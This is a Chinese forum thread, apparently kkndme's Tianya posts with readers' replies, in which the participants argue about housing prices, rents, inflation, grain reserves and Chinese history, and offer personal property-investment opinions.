<p>四线城市房价也会缓步上涨，但比较慢，主要还是因人工成本，原材料价格上涨造成的建筑成本上涨。</p>
<p>城市的空心化可能性不大，人口仍然会缓慢增长。但偏远乡镇却存在空心化的可能。</p>
<p>海南具备得天独厚的海岸线资源，这是全国任何一个其他海滨城市无法比拟的（其他的海滨确实比较差，毫无美感）。但关键还是zf如何开发，急功近利的开发，和毫无节制的圈海岸线可能会大幅降价海南的旅游与投资价值。</p>
<p>取决于政策，有较高风险</p>
</blockquote>
<h2 id="房租问题"><a href="#房租问题" class="headerlink" title="房租问题"></a>房租问题</h2><p>一是再说说房租问题，房租的发展趋势：</p>
<p>现在房租低的一个重要原因是因为，大多数都市小白领还希望能够买一套属于自己的产权房，至少他们觉得即使现在钱钱不够，但是努力一把，跳个脚还能够得着。</p>
<p>所以他们省吃俭用拼命的存钱。一个月薪10000块的小白领租一套月租金3000元的还算舒适的两居室是没有问题的，但是他为了攒钱买房宁可几个人合租一室，仅仅愿意在居住上花费少得可怜的500元钱。</p>
<p>随着国家队的进入，民营资本的退出，房地产开发和房地产投资的门槛都会大幅度提高，投资房产以后就成为富人的专属。</p>
<p>小白领的生活将变得“轻松”，因为除非能够上位，否则一般人跳脚是够不到属于自己的那套房子的。对于拥有房产失去希望，将使他不得不搬出合租房而转而租住一套还算舒适的两居室。</p>
<p>高昂的商品房价把大量的小白领从合租房中解放出来，转而去租住两居室或者三居室。</p>
<p>房租的价格一定会通过市场发现功能，找到他的位置。</p>
<blockquote>
<p><strong>想住清合吗:</strong></p>
<p>看了那么久，突然间觉得，楼主会不会过于武断了？</p>
<p>尽管我也看好房价和房租都上涨，但是，买房应该不会只是富人的专属。例如在日本，有许多的普通白领买的起房，难道在中国，白领就买不起吗？</p>
<p><strong>kkndme:</strong></p>
<p>白领是分层次的，有技术，有能力，有背景，肯吃苦的白领将通过努力获得更多的收入，获取更高的职位，走进金字塔的中层，买房子肯定没有问题。但进入金字塔中层的绝不会占大多数比例。</p>
<p>低级白领，公司办公室普通职员，一无技术，二无资 没有特殊的技能或本领，又没有什么关系和背景，对机会的把握能力也不是很强，如果家里也不富裕，这样的同志今后买房子就比较困难了。金字塔的底层人数比例是最大的。</p>
<p>日本的国情确实跟中国有很大不同，另外日本东京的房子也不是普通白领买的起的。我认识个NEC的部长（相当于中国企业的总监），也算大企业的中层干部，他也在东京买不起房子，家在离东京很远的郊区。</p>
<p><strong>中年不惑吗:</strong><br>日本的城市化已完成，不过东京市中心的房子小白领是买不起的，他们买的是东京卫星小城市的房子。</p>
<p>如同你在上海工作，去扬州买房子还是能承受的，人家的地铁一个小时能跑200公里，你说生活半径能扩大多少呢 再说日本是有选票的。</p>
<p><strong>kkndme：</strong></p>
<p>没错，就是这个道理。天涯里有些人说年薪30万买不起房，年薪70万买不起房。原因还是期望太高了，以为自己年薪70万了，就是人上人了，就必须住市中心的大房子。</p>
<p>但事实上市中心的大房子是绝对稀缺的，人上有人，天外有天。</p>
<p>买房子还是量力而行。有1000万资产的人是买不起价值2000万的翡翠的。有1个亿资产的人也不能买下故宫的居住权。</p>
</blockquote>
<blockquote>
<p><strong>vavan2010：</strong></p>
<p>楼主说得好，根据你所描述的，关于房租的这一块，我看到的前景是，由于国家队的加入和垄断，以后开发商只有可能是财雄势大集团的地产商和国家队这两种了。</p>
<p>而大量的建筑公屋，也是要分租赁市场的一杯之羹，又有公租房又有廉租房，再加上物业税的出台，这样愿意持有普通住宅多套的收租客会不会减少？</p>
<p>因为没钱买的会去租公租或廉租，有钱租的也去租高端好房，就象香港一样，有钱的买商品房，一般的买普通限价房，经济实用房，没钱的住公屋或廉租。反而持有普通住宅多套的会不会逐渐减？</p>
<p><strong>kkndme：</strong></p>
<p>公租房只能是有一定量，不会是大量，首先解决的也是体制内的住房问题。持有多套住宅的有自己的市场空间。</p>
<p><strong>醉生梦思1：</strong></p>
<p>这个问题很好解答，香港公租房占5成比例，私人租房市场委缩了吗？没有，这是市场上不同档次的产品，对应不同的需求。</p>
<p>就像有人看盘，绿化不好，没有游泳池的房子坚决不要是一样的道理。</p>
</blockquote>
<h2 id="粮食问题"><a href="#粮食问题" class="headerlink" title="粮食问题"></a>粮食问题</h2><p>中国的粮食实行储备制度，国家每年从农民手里收购一定数量粮食以及进口一定数量的粮食用于储备。</p>
<p>中国的稻米主要出自东北和广西，东北米好吃但产量小价格高，广西米难吃但产量达价格低，都市人都愿意花高点的价格购买东北米。</p>
<p>各地储粮通行的做法是以储粮为名收购的东北米加价在市场上出售牟取利润，再低价收购难吃的广西米用于粮食储备。</p>
<p>米在市场上的价格差别还是很大的，好的东北米可以卖到5块钱一市斤，一般的东北米卖到3块钱左右一斤，差点的东北米卖到2块钱一斤。而广西米基本在2块钱以下，而且除非比较穷的，一般人都不愿意吃。</p>
<p>大家可以看到在市场上交易的大米跟其他商品并没有什么不同，好的稀缺的就贵，差的产量大的就便宜。</p>
<p>但是米和房子不同，一方面米是当年的好吃，放到第二年陈了就不值钱了，第二年土地上新的稻子又长出来，会有新的米下市。</p>
<p>但是房子不会，一栋楼今年卖掉了，明年这块已经卖掉了的土地并不能长出另外一栋楼。另一方面，中国实行的储备粮制度将会在粮食减产的时候平易粮食价格的上涨（尽管储粮和市场上销售的粮食完全不是一个品质），而且国家对口粮的问题会高度重视。</p>
<p>粮食作为商品本身是与土地剥离的，而房屋作为商品却无法从土地剥离出来。这是粮食与房子的根本不同。</p>
<p>商人在粮食稀缺时期进行囤积会枪毙，在粮食丰收时期囤积粮食只能亏损（第二年的米就没人吃了。）</p>
<p>商品房作为商品在市场上交易，而保障房是为了保障低收入群体的最基本居住，这与粮食分为储备粮和商品粮又多少有些相似。</p>
<p>但是商品房土地和房屋无法剥离，产权和居住权却是剥离的，这就使既保障人民的基本居住权，又通过产权的升值牟取巨大的利益成为可能。zf实在是再明白不过了。</p>
<blockquote>
<p><strong>Razerwu：</strong></p>
<p>我也年纪小，07年才毕业，学经济的，人文历史基础有一点，关注房价有两年了。看了楼主帖子，更是开朗了。</p>
<p>升斗小民一定要跟形式跑，千万别一厢情愿，也别被媒体的话语误导了。</p>
<p>以后，征服会逐渐保证居者有其屋，但是不是每个家庭住的房子有自己产权。中国社会阶层分化很严重。主要分体制内和体制外两个群体。体制内的即使明摆着的收入一般，但是福利好。体制外的，有高薪的，但是低收入的更多。我们公司一般在年收入到手5-6W左右。这个应该是这个城市的平均水平了。我相信50%的人都在这个数。这个收入租个房子，除去其他生活开支，一年还能余个1,2W，如果是两个人一起生活，也能养小孩的，只是，你永远买不起自己的房子。</p>
<p>但是我也知道，更多的小白领，在空调房里工作，一个月就领1000来块的薪水，而那里房价也不低，8000-10000了。你还是买不起。</p>
<p>所以，未来你可以选择在房价高的地方生活，然后租房。你也可以选择回到三四线城市。但是很可能，到时候那里的房子价格也不低，如果你能力够，还是有希望买到商品房。</p>
<p>非常有钱的人很多，我不知道他们会怎样投资。</p>
<p>我想给一些跟我一样收入层次的人一些建议。</p>
<p>物价必涨，这是趋势，如今农村的农民都不怎么种地了，征服在搞平整，以后都会自动流转，每个村的徒弟承包给一个人，别的农民给他打工。有资金的农村出来的，可以考虑往农业方向发展。</p>
<p>我薪水收入一般，但是有外快，跟女友一块存钱，年收入超过20W，</p>
<p>楼主在帖子里提到长沙和石家庄的例子，我认为，二三线城市也要具体分析，像我老家长沙，房产升值空间还是有的，只要每年涨20%，我就满足了。</p>
<p>一线城市的房子更稀缺，但是，城市化的进程，不可能继续像上一个10年那样，大家都往一线城市跑了。所以，房地产暴涨的时代我不相信还有。我还相信二线城市和一线的房价差距会慢慢拉近。</p>
<p>所以，我用09年的结余，在今年上半年长沙贷款买了一套，我准备下半年再买一套。我不是炒房，我是略有结余的工薪阶层，我选择保值，总比放在银行要好。事实证明我是对的上半年买的现在已经涨了10%了。</p>
<p>一线和省会城市的商品房，未来一定会成为更加稀缺的资源。</p>
<p><strong>kkndme：</strong></p>
<p>长沙的房子一定会涨，只不过涨得会比其他城市慢。</p>
<p>低价买涨幅滞后的房子有一个好处，一旦长沙放出“大量拆迁”等利好因素，你就赚大了。购买房价基数低的省会城市，怎么都不会亏的</p>
</blockquote>
<p>还有一个关于实体经济的问题，房地产是资本市场还是实体经济？</p>
<p>我们回顾一下，房地产的居住属性和产权属性是剥离的。</p>
<p>依照房地产的居住属性，房地产绝对属于实体经济。</p>
<p>从下游来说，不搬新家重新购买一套家具、一套家电、做一次大的装修的可能性都不大。在没有改善住房的前提下，去换家具家电，搞装修的应该是一个很小的比例。</p>
<p>从上游来说，钢铁、水泥、机械等行业无一不受到到房地产的影响。</p>
<p>房地产影响到钢铁、水泥、机械、家电、家具、建筑建材等多种领域，影响真的不小。</p>
<p>依照房地产的产权属性，房地产又是资本市场。</p>
<p>资金推动了商品房价格的快速上涨。</p>
<p>房地产为政府积聚了大量的财富（卖地），这些财富用来建造地铁、公园、广场、办公大楼、公款招待、潇洒挥霍，又推动了实体经济的增长。</p>
<blockquote>
<h4 id="房价不可能跌的三个原因"><a href="#房价不可能跌的三个原因" class="headerlink" title="房价不可能跌的三个原因"></a>房价不可能跌的三个原因</h4><p><strong>sunxishila:</strong></p>
<p>我认为房价不可能跌的（至少5年内） ，尤其北上广，因为</p>
<p>1，地球资源就那么点，美国人不可能允许所有的人都过上他们那样的高消耗生活，所以美国人就尽可能地创造无产阶级国家来为其当奴隶进行打工。</p>
<p>中国的现状也一样，利益集团以及国家政府为了其利益以及维稳庞大的执政集团必须要通过工具将更多的人丧失生产资料以便当其奴隶。试想如果人人都有房住，人人都有闲钱可以自由的选择生活方式，我们以出口为主的血汗工厂还能招得到工人吗？北上广还能存在这么多外资企业吗？外资企业没的话，没这么多就业机会，所有的外地人回家了，上海的办公楼，出租房不全完蛋了，那么势必减少了各种税收，那么北上广正常的维持城市运行的资金必将断裂…怎么可能呢。</p>
<p>2，适度宽松的货币政策（也就是过量发行的货币）必将导致通货膨胀，在中国货币多了必将走进房地产，因为在中国基本没有别的更靠谱的投资渠道。长期看来，货币一直是贬值的 ，世界上几乎所有的国家货币一直都在贬值，这是货币的固有属性，就是剥削。除非取消货币，可能吗？</p>
<p>3，房价下跌或者价格合理当然是有可能的，可是这取决于政治，除非取消一党执政，除非土地似有话，原因相信大家都清楚，你们认为近期可能吗？</p>
</blockquote>
<h2 id="什么是傻空？"><a href="#什么是傻空？" class="headerlink" title="什么是傻空？"></a>什么是傻空？</h2><p>关于买房量力而行的事，还是有必要再说得清楚些的。</p>
<p>还是打个比方</p>
<p>假设某人家庭月收入15000块（都市小白领的通常收入），工作6年，手里有50万存款，我可以在北京北五环外（比如西三旗或者回龙观）买一套价值150万的房子（2万每平米，70几平米）。首付50万，贷款100万，月供7000多，是完全买的起的，而且因为轻轨的开通，即使在市中心工作，上班时间肯定可以在2个小时之内（作为北京这个城市来说是可以接受的）。</p>
<p>但是这个人心比较高，非要在北四环内，买一套100平的住宅，二手房3万一平米，100平米就是300万。首付按30%算，也就是90万，还要贷210万，已经完全超过了他的收入水平及收入预期。于是这个人成天怨天尤人，成天喊自己买不起房，抱怨zf，憎恨炒房客和开发商。天天叫唤社会不公平。</p>
<p>过了1年，国家队布局完毕，西三旗、回龙观房价涨到30000一平米了，买个70平的还要210万。首付30%，要60多万，贷款150万，月供12000左右。这时，他买西三旗70多平米的房子已经很费劲了。</p>
<p>这种行为叫什么？这就叫傻空。</p>
<h2 id="什么是真买不起房？"><a href="#什么是真买不起房？" class="headerlink" title="什么是真买不起房？"></a>什么是真买不起房？</h2><p>再比如说</p>
<p>某人家庭月收入比较低，8000块，在北京上班，西三旗和回龙观的房也要150万的总价，是买不起的。他的收入水平只能在密云或者河北买房子，但是即使在密云或者河北买了房也没办法上班。这个人就叫做真的买不起房。</p>
<p>如果他对未来的收入预期也不是很高的话，房价未来的上涨将使他进一步对买方绝望，他将彻底放弃攒钱买房，带着老婆孩子搬出跟人合租的城中村，每月花费2500块钱在回龙观租一间两室一厅的住宅。</p>
<p>日子就这么过下去了。</p>
<p>量变将引起质变，8000块钱的家庭月收入，是真买不起房的家庭，而15000月收入的家庭买不起房就叫傻空。</p>
<h2 id="分析问题要深入"><a href="#分析问题要深入" class="headerlink" title="分析问题要深入"></a>分析问题要深入</h2><p>小时候看春秋战国之类的书籍，总弄不明白一个问题：</p>
<p>a国家跟c国家打，他的邻国b就会很害怕，害怕a国家灭了c国家实力更强大，对自己不利。</p>
<p>e国家跟g国家打，他的邻国f就会很高兴，高兴e国家与g国家两败俱伤，自己可以获取利益。</p>
<p>后来我终于弄懂了。</p>
<p>当a国家跟c国家打仗时，如果a的国力明显强过c,他的邻国b就会很害怕，因为a国家很轻易就会灭掉c国家变得更强大。</p>
<p>当a国家跟c国家打仗时，如果a的国力跟c差不多,他的邻国b就会很高兴，因为a国家跟c国家会拼得两败俱伤。</p>
<p>分析问题，一定要深入的研究啊</p>
<h2 id="从贵阳的现状看中国的未来"><a href="#从贵阳的现状看中国的未来" class="headerlink" title="从贵阳的现状看中国的未来"></a>从贵阳的现状看中国的未来</h2><p>旅行的第一站，是贵阳。</p>
<p>一座低收入高消费的西部边远城市。</p>
<p>当地人说贵阳的消费太黑人，太畸形了。大多数当地人的收入相当于中部城市的县城水平，生活必需品的消费却超过了北京。</p>
<p>越偏远的地方越黑暗，越偏远的地方越不存在公平，越偏远的地方贫穷群众的比例越大，越偏远的地方权贵生活的越腐败、越奢华。</p>
<p>越是资源匮乏的地区，权贵阶层越富裕，这是以绝大多数人的贫穷为代价的。</p>
<p>资源的稀缺，导致权贵易于对资源形成垄断，通过以低收入高物价的方式，对底层群体进行赤裸裸的掠夺。</p>
<p>于是权贵们鲜衣怒马，下层群众褴褛衣衫。</p>
<p>贵州难道不是中国的缩影吗？</p>
<p>在欧洲的商业区，我国权贵们一掷万金，引来欧洲群众围观，瞠目结舌。以至于全世界都没法相信我国不是超级发达国家。</p>
<p>贵阳的近郊房价已经9000一平米，远郊的金阳房价已经接近了6000一平。</p>
<p>但是我们能就此判断贵阳的房价存在巨大泡沫吗？</p>
<p>贵阳到处是山，地少人多，物产极不丰富。</p>
<p>因此，贵阳的商品房就像贵阳的餐厅一样，和普通群众是完全没有关系的。而对于权贵与精英来说，即使再翻几倍的价格也一样买得起。（腐败啊）</p>
<p>看看贵阳，想想中国。</p>
<p>资源的匮乏将形成高度的垄断，导致贫富分化进一步加剧，生活成本大幅度提高，中国正走向低收入高消费的畸形社会结构，群众生活越艰难，权贵的生活就会越富足。</p>
<p>生活必需品和房价都会变得比西方国家更贵。</p>
<h2 id="货币贬值"><a href="#货币贬值" class="headerlink" title="货币贬值"></a>货币贬值</h2><p>货币贬值，来自于大量的印钞</p>
<p>可不可以少发点钞票。</p>
<p>对不起，不行。</p>
<p>这是我国的官有经济体制决定的。</p>
<p>凡是去过美国的朋友，会惊奇一个现象</p>
<p>除了人工服务行业，几乎大多数产品的绝对价格都低于国内。</p>
<p>从数码产品，到奢饰品，从矿泉水，鸡蛋到汽车，统统比国内的绝对价格（把美金换成人民币，再拿人民币进行比较）便宜。（美国的餐馆比较贵是因为包含了人工服务成本）</p>
<p>不仅仅是美国货比在中国卖的便宜，几乎所有 made in china 的商品在美国卖的绝对价格都低于国内售价（一件国内生产出口的服装在美国售价150人民币左右，但在国内售价竟然达到800-1000人民币）</p>
<p>贫穷的发展中国家——我们的物价却远远高于美国，这是什么样的原因呢？</p>
<p>我想主要还是我们的体制决定的：</p>
<p>1、高昂的行政成本</p>
<p>中国庞大的公务员队伍对货币的消耗达到惊人的程度。任何一种商品的销售都要分摊政府高昂的行政开支。不大量印钞票是无法维持正常运转的</p>
<p>2、过渡依靠政府投资。</p>
<p>大家都知道，中国的经济发展，是依靠政府投资为主导的，全世界都知道，政府投资的效率是最底下的，1个亿的投资往好了说只能产生3000万的效益，剩余7000万损耗掉了。因此政府不得不持续增加货币发行量</p>
<p>3、惊人的fb成本</p>
<p>一集中箱货物运到美国的成本甚至低于从北京运到深圳的国内运费。这是令人惊讶的事情，又是确凿的事实。中国高昂的高速费用使物流贵得吓人，从农民手中2分钱收购的蔬菜，运到了目的地，成本就变成了1元钱。</p>
<p>这中间不仅仅是高速费，当公路及铁路运输变得紧张的时候，你不得不花费比高速费更贵的支出用于打点关系。</p>
<p>关系的成本已经远远贵过商品本身。惊人的fb成本是物价上涨的重要原因，因为权贵贪心也是逐年增加的，fb成本越来越高。fb成本的每年高速增长，迫使印钞需求高速增长。</p>
<p>4、低附加值产品出口创汇</p>
<p>低附加值产品出口创汇是我国经济发展的主要支柱。</p>
<p>可以这样理解，我们的商品卖到了国外，换回的是外汇。国内的商品少了，就变贵了。</p>
<p>换回的外汇，国家就会按照外汇的总金额依据汇率全都印成人民币，投放到社会。社会上不但商品变少了，每年还会多印出一大堆钞票，这就是通货膨胀。货币的购买力在持续贬值，国家通过货币持续贬值来收割普通劳动者的羊毛。</p>
<p>所以说我国高通胀，货币持续贬值，是官有经济体制所决定的。</p>
<p>是不可能改变的。</p>
<p>持有闲置现金的风险，比持有任何一种可保存的商品的风险都大。</p>
<p>奉劝那些盼着zf政策出打击房产直到崩盘，以此得到高潮的同志们，真的不要等了，除非出现明末的极端事件，否则一辈子等不到高潮。</p>
<p>也奉劝希望房价能降个30%-50%好买套自己的房子的善良百姓，还是看有什么机会多挣点钱吧，等房价大降真的不现实。</p>
<p>百姓们希望领导们能给自己做个主，可是几千年以来，中国的上位者们从来都只考虑一个问题：“卧榻之上，岂容他人安睡。”真的没有时间管你们的那些小事儿。</p>
<blockquote>
<h4 id="关于康乾盛世的讨论"><a href="#关于康乾盛世的讨论" class="headerlink" title="关于康乾盛世的讨论"></a>关于康乾盛世的讨论</h4><p><strong>中年不惑吗:</strong></p>
<p>大家应该知道所谓的康乾盛世，开元盛世都是什么样子了</p>
<p>上层阶级的盛世而已</p>
<p>底层老百姓在史书上连“某人甲，某人乙”都留不下</p>
<p><strong>dantez13:</strong></p>
<p>康乾确实是虚假的所谓“盛世”开元还是不错的 </p>
<p>看历史不光纵向看 也要横向看</p>
<p><strong>kkndme:</strong></p>
<p>开元盛世留下巨大的隐患才导致玄宗悲惨的人生，不应简单的认为是杨玉环和安史之乱的原因。</p>
<p>首先是大量的土地兼并，大量的农民同志逃跑，社会的不安定为安史之乱埋下了隐患。还有就是节度使的权力太大，以全国之力供养节度使的军备，而内地养了一群废兵。</p>
<p>相当于老大把精兵干将派去边远山区收保护费，结果自己身边连个像样的保镖都没有。有个收保护费的领班突然不爽，自己想当老大，带着打手跑回去揍老大，准备上位。这时老大就光杆司令一个，看着自己的手下叛变之能干瞪眼</p>
<p><strong>dantez13:</strong></p>
<p>我说的看历史纵向横向的意思是指</p>
<p>康乾时期 纵向来看 还算是个稳定时期 但是17 18世纪 欧洲正轰轰烈烈的搞工业革命 </p>
<p>乾隆却几下江南 还搞什么骑射乃满洲之本</p>
<p>而开元时期 ，虽然的确有很多隐患 但是大唐还是当之无愧的世界老大 </p>
<p>唐朝也是那个时候达到的巅峰</p>
<p><strong>kkndme:</strong></p>
<p>呵呵，大唐当世界老大也不知道是好事还是坏事。</p>
<p>欧洲经历了漫长的中世纪黑暗时代，结果由诸侯割据的封建社会直接进入了资本主义社会，并向国家社会主义过渡。</p>
<p>中国早在秦就结束了诸侯国林立的封建时代，进入了大一统高度集权的帝国时代，到现在也没完全结束。</p>
</blockquote>
<h2 id="房价可能的下跌方式"><a href="#房价可能的下跌方式" class="headerlink" title="房价可能的下跌方式"></a>房价可能的下跌方式</h2><p>几天没有上来，发现来了很多比较鸡冻的同志。心情可予以理解。</p>
<p>但是鸡冻并不能让日子过的更好。</p>
<p>油价大涨小跌，我们鸡冻了，但是事实并没有改变。</p>
<p>高速费早就收回成本，可是依然雷打不动的收着，我们鸡冻了，可是事实也没有任何改变。</p>
<p>房价就能真如很多人所愿，使劲跌到人人买的起吗？今后的现实将告诉我们答案。</p>
<p>房价会不会跌？</p>
<p>我说在较远的将来一定会跌，但下跌的方式是完全不同的。不可能象大家所期望的由2010年的30000一平跌到2004年的6000一平。</p>
<p>下跌一定是另一种方式：当农产品价格以几年翻10倍甚至几十倍的速度上涨的时候，房产却相对滞涨。这是最有可能的下跌方式。</p>
<p>最善良的意愿并不能阻止事务向邪恶的方向发展。</p>
<p>我们大家都很清楚却都没关注的一个常识，当我们满怀热情无偿献血的时候，有哪个贫穷的患者在需要输血时，能够因为广大群众的无偿献血而得到医院的优惠吗？</p>
<p>不能，无论你是穷是富，只要你是平头百姓，你都不得不因为需要输血而支付昂贵的医药费。</p>
<p>同样，zf并不会因为拆迁给你补偿的太低，而强迫开发商降低房价卖给群众。压低建设成本，抬高售价，中间的利润由商人和权贵进行分配，这是官商结合的通行做法。自古以来，能够赚大钱的都是红顶商人，而不是普通个体户。</p>
<p>对于很多鸡冻的群众，指着鼻子问我：国家会不管吗？疯狂难道不是导致灭亡吗？</p>
<p>我告诉你，通货膨胀就是减缓灭亡时间的最好良药</p>
<blockquote>
<p><strong>被忽悠的群众:</strong></p>
<p>通货膨胀是zf偷偷掠夺人民财富的手段，极少数人暴利，怎是良药？？？</p>
<p><strong>kkndme:</strong></p>
<p>通货膨胀是zf偷偷掠夺人民财富的手段，极少数人暴利————没错，通货膨胀就是剪老百姓的羊毛，让权贵的财富更集中，中下层群众更贫穷。</p>
<p>但是，从国家的统治与巩固来讲，的确是良药啊（当然有一定限度）。</p>
<p>当大多数资源掌握在少数人手中的时候，占有绝大多数的金字塔下层的群众能够分配到的资源就越少，资源的价格就会越高，少数的金字塔中上层的既得利益者就会越富有。</p>
<p>大家知道，有些资源会变成富人间的游戏（比如现在的古董，字画），完全失去群众基础；而如果与生活密切相关的资源过度集中，一定会爆发极端冲突事件，造成社会动荡。</p>
<p>zf通过不断稀释货币的实际购买能力，并且对粮食等生活必需品实行平准制度，一方面保证了绝大多数人民的基本吃饭问题，另一方面让中下层群众手中的余钱基本消耗在特定的商品上，以至于不得不马不停蹄的劳作，这才能保证社会的稳定和向前发展。而上层精英就可以坐享其成。</p>
<p>让我们回顾一下过去</p>
<p>80年代，那时的人们靠省吃俭用积攒出节余，被消耗在自行车、手表、缝纫机上。通过不断的劳动，才能吃饱饭，才能攒点钱买三大件取媳妇。</p>
<p>80年代末，90年代初，人们的工资提高了，手里的结余增加了，彩电、冰箱的大规模普及又消灭了老百姓手中的流动性。</p>
<p>紧接着电话、空调又接过了彩电、冰箱的大旗。那时安装个电话可要5000大元啊。</p>
<p>随着工业化水平大幅度提高，经济高速增长，货币发行量也迅速增加，彩电、冰箱等工业化大规模产品已经不具备稀缺资源的特性，也无法吸收百姓手中庞大的结余资金。</p>
<p>汽车和商品房的发展成为消灭老百姓手中的流动性的最好工具。</p>
<p>在经济发展的大潮中，一旦对资源的支配权可以换取利益，贫富两极分化是发展的必然。随着贫富分化开始加剧，财富集中在少部分人手中，集中了大量财富的少部分人已经不满足于购买普通的消费品（汽车是工业化的产物，不具备稀缺性），对投资品的追捧造就了2005年房地产的崛起。</p>
<p>房地产具备了投资品和生活必须品的双重属性，即可以让金字塔中上层的精英群体依靠房地产保值增值，又可吸收掉中下层群众的未来若干年的结余资金。</p>
<p>大量印刷的货币还是有一定数量留到勤劳肯干的白领手中的，而这些货币又因为通货膨胀因素消耗在不断上涨的生活必需品上，必需品中商品房占了大头。</p>
<p>于是拥有大量房产的金字塔中上层精英可以坐享其成，享受房产升值带来的收益，而中下层群众不得不为房子打工。</p>
<p>发行大量货币满足经济发展的需要，同时通过通货膨胀来消灭广大群众手中的流动性，是zf稳定社会，发展经济的法宝，适度的通货膨胀当然是缓解社会矛盾的良药</p>
<p><strong>tjOOSAN:</strong></p>
<p>楼主！这段话，我不是很明白。</p>
<p>好像世界上，每个国家都是如此把？谁会不买东西？谁会不买生活必须品？</p>
<p>别忘了，中国发展到现在，百姓也没有能力购买一切生活必须品！当然，随着社会的发展，人民在一点一点的去完善基本生活。</p>
<p>这你却说成。。。精英和国家的阴谋。。。我。。。很难理解。</p>
<blockquote>
<p><strong>kkndme:</strong></p>
<p>不是阴谋，我没提过一句阴谋，是国策</p>
<p>好比美国，以中产阶级利益为代表的美国，一个币值相对稳定的国家，主导借钱消费，这就是国策。</p>
<p>当08年的金融危机，多数中产却尝到了惨痛的教训。而在美国的华人，因为热爱储蓄的原因（这跟美国币值相对稳定、华人储蓄习惯都有关系），生活并没有受到太大影响。</p>
</blockquote>
<p>稳定粮食价格，这对每个国家而言，都是必须的啊！？？这最最基本了吧？</p>
<p>房子为什么涨价？？？国家决策！懂吗？间接取消了经济适用房政策。市场上百分之九十都是商品房！！你告诉我，房价能不涨吗？</p>
<p>房价涨了，受益人是谁？？？是政府！！不是你嘴里所谓的精英，他们只是傀儡罢了！</p>
</blockquote>
<p>明朝末年，可怜的崇祯皇帝面临的最可怕的问题貌似两个:一是努尔哈赤的入侵；一是大饥荒下，到处闹蚁贼。</p>
<p>光是努尔哈赤的入侵，明末的关宁铁骑完全可以将满人挡在山海关外；光是蚁贼肆虐，凭洪承畴、孙传庭等名将镇压一群乌合之众还是易如反掌的；内忧外患才导致了明朝的灭亡。这是通行的说法。</p>
<p>明朝灭亡的真正原因，是经济原因。</p>
<p>当然，这也是句废话，无论是社会的稳定，还是国家的动乱，或者邻国间的战争，都是经济原因导致的。</p>
<p>明朝真正灭亡的原因是：货币供给不足。</p>
<p>不要说百姓的经济行为受到很大制约，即使是军队也发不出饷银。以至于除了关宁铁骑以外，明朝就找不出一支有战斗力的军队，甚至洪承畴、孙传庭打高迎祥、李自成、张献忠，居然靠农民军的馈赠过日子。</p>
<p>货币供给不足，明朝的经济崩溃了。</p>
<p>再谈谈鸦片战争和那个满脑子浆糊的林则徐。</p>
<p>鸦片战争的原因，在于大清国与欧洲诸国之间存在的巨大贸易顺差。</p>
<p>大清虽然闭关锁国，丝绸、茶叶、瓷器通过民间和官员私下大量出口欧洲换取白银，却没有任何的进口需求。以至于英、法国家不得不世界范围开采银矿，但依然不能满足采购中国商品的需求。</p>
<p>英法诸国必须要与中国通商贸易，才能解决贸易顺差这个根本的问题。英国人实在不知道拿什么商品来进行贸易(貌似中国什么都不需要），于是不法商人想出了鸦片撬开中英贸易缺口的馊主意——这并没有得到英国官方的支持。</p>
<p>但是林则徐同志既不懂得经济，又不懂得外交，对欧洲人的认识也就停留在：我不给你茶叶，你的腿都站不直。</p>
<p>不管洋人打算干什么，总之洋人就是邪恶的，就该抓起来打板子。于是，自然而然的一顿开打，结果可想而知。</p>
<p>于是清朝官员施展出了村骗乡，乡骗县，一骗骗到guowuyuan，的传统技能，咸丰同志在故宫几乎自始至终听到的都是捷报频传。</p>
<p>清末，一会儿闹拳匪，一会儿闹白莲教，一会儿闹太平天国。然而，靠鸡冻的群众杀几个洋毛子并不能使中国变得强大。林则徐如果能够有点知识，不妄自尊大，能够说动咸丰开放正常通商贸易、拒绝鸦片，联军入侵圆明园的事大致可以避免。</p>
<p>经济问题才是导致社会动荡，战争爆发的根源。</p>
<h2 id="房产投资的问题"><a href="#房产投资的问题" class="headerlink" title="房产投资的问题"></a>房产投资的问题</h2><p>感谢大家的支持，不少朋友还提了一些关于房产投资的问题。</p>
<p>我觉得无论做什么样的投资，自己一定要做足功课。就房产来说，对于区域经济发展，要有深刻的理解，否则就不要轻易出手。</p>
<p>关于房产，我只是从大方向上说了一下自己的判断，并没有对区域的房产升值做过研究，所以没法给大家提供建议，请大家谅解。</p>
<p>不过，关于房产投资的方向，也有几点心得：供大家参考：</p>
<p>一、坚决不能投资自己不熟悉的城市</p>
<p>二、坚决不投资中小城市，一般省会及计划单列以上城市问题都不大，但中小城市即使房价上涨也存在变现困难问题。</p>
<p>三、坚决不投资距离大城市较偏远的旅游城市，比如山东乳山之类的，几乎无法变现。</p>
<p>四、慎重投资大城市的郊区，除非价格绝对低。如果外来人口比较多，zf又有发展规划，且价格与城区相比有较大的价差，才可以考虑</p>
<h2 id="买房时机"><a href="#买房时机" class="headerlink" title="买房时机"></a>买房时机</h2><p>很多朋友都关心买房时机问题</p>
<p>对于自住需求者和投资需求者是要区别对待的</p>
<p>对于一线城市与二三线城市也是要区别对待的</p>
<p>对于自住需求者（仅指普通群众）来说，只要你还有钱能够买的起房，那你就买吧。不要赌博和赌气，因为真的赌不起。人人都可以买得起商品房，只是一个美丽的童话。当然如果你赶上了国家调控的好时机，那你就要认真选房，做足功课，迅速出手。因为买到一套户型、位置、楼层都让你满意的房子，在商品房热销期，是很难的事情，根本没有给你挑选的机会，而在调控期，或许房价没怎么下降，但绝对给了你挑选的余地。</p>
<p>对于投资来说，问题就比较复杂，要考虑的问题就会更多，不同条件的人就有不同的需求。</p>
<p>总的来说在严厉调控期，需要关注以下几点：</p>
<p>一、当新盘的价格低于周边二手房的价格。<br>二、当看房的人不断增加<br>三、当kas拿地热情大减，以至于多处土地流拍</p>
<p>以上三点是提示你准备出手的信号。</p>
<p>对于一线城市，一定会有一段时期小幅下跌，及跌后滞涨。</p>
<p>对于二三线城市，多数城市会缓步持续上涨。但遇到大规模拆迁的城市，那房价就会忽视调控，选择快速上涨。近期，在二三线城市，无论自住还是投资，都是早买好于晚买。</p>
<h2 id="关于调控"><a href="#关于调控" class="headerlink" title="关于调控"></a>关于调控</h2><p>短期的调控并不能改变长期上涨的趋势，</p>
<p>当资金的运作规律收到外力的压制，短暂低头的房价就会迎来暴涨。这是规律。</p>
<h2 id="普通人该怎么办？"><a href="#普通人该怎么办？" class="headerlink" title="普通人该怎么办？"></a>普通人该怎么办？</h2><blockquote>
<p><strong>被忽悠的群众：</strong></p>
<p>我们P民怎么办呢？只有买房保住自己的社会地位！？</p>
<p><strong>kkndme：</strong></p>
<p>问题是房子将会是普通人越来越难以参与的游戏，门槛越来越高。</p>
